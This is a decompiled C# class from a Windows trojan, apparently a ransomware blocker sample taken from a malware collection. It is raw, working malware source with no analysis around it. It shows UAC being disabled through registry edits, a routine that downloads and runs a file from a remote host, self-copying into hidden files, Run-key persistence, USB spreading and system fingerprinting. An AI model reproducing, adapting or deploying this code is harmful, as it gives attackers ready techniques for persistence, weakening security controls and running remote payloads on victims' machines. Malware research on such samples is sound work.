// Decompiled with JetBrains decompiler
// Type: rundll32.misc
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using Microsoft.Win32;
using rundll32.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace rundll32
{
  internal class misc
  {
    [DllImport("kernel32.dll")]
    private static extern long GetVolumeInformation(
      string PathName,
      StringBuilder VolumeNameBuffer,
      uint VolumeNameSize,
      ref uint VolumeSerialNumber,
      ref uint MaximumComponentLength,
      ref uint FileSystemFlags,
      StringBuilder FileSystemNameBuffer,
      uint FileSystemNameSize);

    public static void disableUAC()
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey.GetValue("EnableLUA").ToString() == "1")
          registryKey.SetValue("EnableLUA", (object) "0");
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (!(registryKey.GetValue("EnableLUA").ToString() == "1"))
          return;
        registryKey.SetValue("EnableLUA", (object) "0");
      }
      catch
      {
      }
    }

    public static void download(string host, string loc, bool execute)
    {
      new WebClient().DownloadFile(host, loc);
      if (!execute)
        return;
      Process.Start(loc);
    }

    public static string GetVolumeSerial(string strDriveLetter)
    {
      uint VolumeSerialNumber = 0;
      uint MaximumComponentLength = 0;
      StringBuilder VolumeNameBuffer = new StringBuilder(256);
      uint FileSystemFlags = 0;
      StringBuilder FileSystemNameBuffer = new StringBuilder(256);
      strDriveLetter += ":\\";
      misc.GetVolumeInformation(strDriveLetter, VolumeNameBuffer, (uint) VolumeNameBuffer.Capacity, ref VolumeSerialNumber, ref MaximumComponentLength, ref FileSystemFlags, FileSystemNameBuffer, (uint) FileSystemNameBuffer.Capacity);
      return Convert.ToString(VolumeSerialNumber);
    }

    public static void copyToStartup(string[][] dirs, string[][] names)
    {
      for (int index1 = 0; index1 < dirs.Length; ++index1)
      {
        for (int index2 = 0; index2 < names.Length; ++index2)
        {
          if (Application.ExecutablePath.ToLower() == dirs[index1][0].ToLower() + "\\" + names[index2][0].ToLower())
            return;
        }
      }
      for (int index3 = 0; index3 < dirs.Length; ++index3)
      {
        misc.extractMsn(dirs[index3][0]);
        for (int index4 = 0; index4 < names.Length; ++index4)
          misc.infect(dirs[index3][0], names[index4][0], dirs[index3][1] + names[index4][1]);
      }
      Process.GetCurrentProcess().Kill();
    }

    private static void extractMsn(string dir)
    {
      string path = dir + "\\MSNMessengerAPI.dll";
      try
      {
        if (!Directory.Exists(dir))
          Directory.CreateDirectory(dir);
        if (System.IO.File.Exists(path))
          return;
        System.IO.File.WriteAllBytes(path, Resources.MSNMessengerAPI);
        foreach (string str in new List<string>()
        {
          "attrib +r +s +h +i \"" + path + "\""
        })
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            CreateNoWindow = true,
            UseShellExecute = true,
            Arguments = "/c " + str,
            WindowStyle = ProcessWindowStyle.Hidden
          }).WaitForExit();
      }
      catch
      {
      }
    }

    private static void infect(string dir, string name, string regName)
    {
      string str1 = dir + "\\" + name;
      try
      {
        foreach (string str2 in new List<string>()
        {
          "copy /y \"" + Application.ExecutablePath + "\" \"" + str1 + "\"",
          "attrib +r +s +h +i \"" + str1 + "\""
        })
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            CreateNoWindow = true,
            UseShellExecute = true,
            Arguments = "/c " + str2,
            WindowStyle = ProcessWindowStyle.Hidden
          }).WaitForExit();
        if (!System.IO.File.Exists(str1))
          return;
        foreach (string key in config.keys)
        {
          try
          {
            if (Program.usbRun)
              Registry.CurrentUser.OpenSubKey(key, true).SetValue(regName, (object) (str1 + " usb"));
            else
              Registry.CurrentUser.OpenSubKey(key, true).SetValue(regName, (object) str1);
          }
          catch
          {
          }
          try
          {
            if (Program.usbRun)
              Registry.LocalMachine.OpenSubKey(key, true).SetValue(regName, (object) (str1 + " usb"));
            else
              Registry.LocalMachine.OpenSubKey(key, true).SetValue(regName, (object) str1);
          }
          catch
          {
          }
        }
        if (Program.usbRun)
          Process.Start(new ProcessStartInfo(str1, "newusb")
          {
            WorkingDirectory = dir + "\\"
          });
        else
          Process.Start(new ProcessStartInfo(str1, "new")
          {
            WorkingDirectory = dir + "\\"
          });
      }
      catch
      {
      }
    }

    public static void remove(string[][] dirs, string[][] names)
    {
      for (int index1 = 0; index1 < dirs.Length; ++index1)
      {
        for (int index2 = 0; index2 < names.Length; ++index2)
          misc._remove(dirs[index1][0], names[index2][0], dirs[index1][1] + names[index2][1]);
      }
    }

    private static void _remove(string dir, string name, string regName)
    {
      string path1 = dir + "\\" + name;
      if (!System.IO.File.Exists(path1))
        return;
      string path2 = new Random().Next(1000, 9999).ToString() + ".bat";
      StreamWriter streamWriter = new StreamWriter(path2);
      streamWriter.WriteLine("@echo off");
      streamWriter.WriteLine(":a");
      streamWriter.WriteLine("attrib -r -s -h -i \"" + path1 + "\"");
      streamWriter.WriteLine("del \"" + path1 + "\"");
      streamWriter.WriteLine("IF EXIST \"" + path1 + "\" GOTO a");
      streamWriter.WriteLine("del %0");
      streamWriter.Close();
      new Process()
      {
        EnableRaisingEvents = false,
        StartInfo = {
          WindowStyle = ProcessWindowStyle.Hidden,
          FileName = path2
        }
      }.Start();
      foreach (string key in config.keys)
      {
        try
        {
          Registry.CurrentUser.OpenSubKey(key, true).DeleteValue(regName);
        }
        catch
        {
        }
        try
        {
          Registry.LocalMachine.OpenSubKey(key, true).DeleteValue(regName);
        }
        catch
        {
        }
      }
    }

    public static string FormatBytes(long bytes)
    {
      string[] strArray = new string[4]
      {
        "GB",
        "MB",
        "KB",
        "Bytes"
      };
      long d2 = (long) Math.Pow(1024.0, (double) (strArray.Length - 1));
      foreach (string str in strArray)
      {
        if (bytes > d2)
          return string.Format("{0:##.##} {1}", (object) Decimal.Divide((Decimal) bytes, (Decimal) d2), (object) str);
        d2 /= 1024L;
      }
      return "0 Bytes";
    }

    public static string getLoc() => Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName.ToUpper();

    public static string getOS()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string os = "Unknown";
      switch (osVersion.Platform)
      {
        case PlatformID.Win32Windows:
          switch (osVersion.Version.Minor)
          {
            case 0:
              os = "W95";
              break;
            case 10:
              os = "W98";
              break;
            case 90:
              os = "wME";
              break;
          }
          break;
        case PlatformID.Win32NT:
          switch (osVersion.Version.Major)
          {
            case 3:
              os = "NT3";
              break;
            case 4:
              os = "NT4";
              break;
            case 5:
              switch (osVersion.Version.Minor)
              {
                case 0:
                  os = "2k0";
                  break;
                case 1:
                  os = "wXP";
                  break;
                case 2:
                  os = "2k3";
                  break;
              }
              break;
            case 6:
              switch (osVersion.Version.Minor)
              {
                case 0:
                  os = "Vis";
                  break;
                case 1:
                  os = "Wi7";
                  break;
              }
              break;
          }
          break;
        case PlatformID.Unix:
          os = "UNX";
          break;
        case PlatformID.MacOSX:
          os = "OSX";
          break;
      }
      return os;
    }
  }
}
